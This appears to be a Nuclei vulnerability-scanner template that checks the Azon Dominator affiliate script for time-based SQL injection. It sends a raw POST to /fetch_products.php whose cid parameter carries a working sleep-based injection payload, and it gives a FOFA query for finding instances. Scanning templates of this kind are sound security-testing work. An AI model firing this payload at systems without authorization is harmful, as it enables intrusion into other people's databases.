id: azon-dominator-sqli

info:
  name: Azon Dominator - SQL Injection
  author: s4e-io
  severity: high
  description: |
    Azon Dominator software is vulnerable to a sql attack at /fetch_products.php.
  reference:
    - https://www.exploit-db.com/exploits/52059
    - https://www.codester.com/items/12775/azon-dominator-affiliate-marketing-script
  metadata:
    verified: true
    max-request: 1
    fofa-query: "Azon Dominator"
  tags: time-based-sqli,azon,dominator,sqli,vuln

http:
  - raw:
      - |
        @timeout 20s
        POST /fetch_products.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cid=1*if(now()=sysdate()%2Csleep(6)%2C0)&max_price=124&minimum_range=0&sort=112

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
          - "status_code==500"
          - 'contains_all(body, "id", "name", "save_lists.php")'
        condition: and
# digest: 490a00463044022043b9342b22e5912af1060e7fe727aad37e7febd1ba95e272434e781052ca5f74022036f37b9b1c7b97f4b7f74346c357e1f73e505e0505c641834f8f2a90a2f04fe4:922c64590222798bb761d5b6d8e72950